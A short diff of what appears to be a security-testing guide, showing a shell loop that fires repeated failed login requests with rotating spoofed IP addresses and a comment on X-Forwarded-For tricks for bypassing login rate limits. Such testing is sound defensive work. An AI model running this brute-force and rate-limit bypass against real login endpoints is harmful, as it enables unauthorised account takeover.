@@ -159,7 +159,7 @@ for i in $(seq 1 60); do
     -d "{\"email\":\"test@$TARGET\",\"password\":\"wrong$i\"}" -o /dev/null -w "%{http_code}")
   echo "Attempt $i (IP $RAND_IP): $RESP"
 done
-# Also try: multiple comma-joined XFF values ("[REDACTED_IP], [REDACTED_IP]"), and appending your real IP
+# Also try: multiple comma-joined XFF values ("203.0.113.10, 198.51.100.23"), and appending your real IP
 # AFTER a spoofed one — some parsers take first, some last.
 # CONFIRM the bypass: re-run Phase 1 WITHOUT rotation to show the 429 returns. The delta is the proof.
 ```
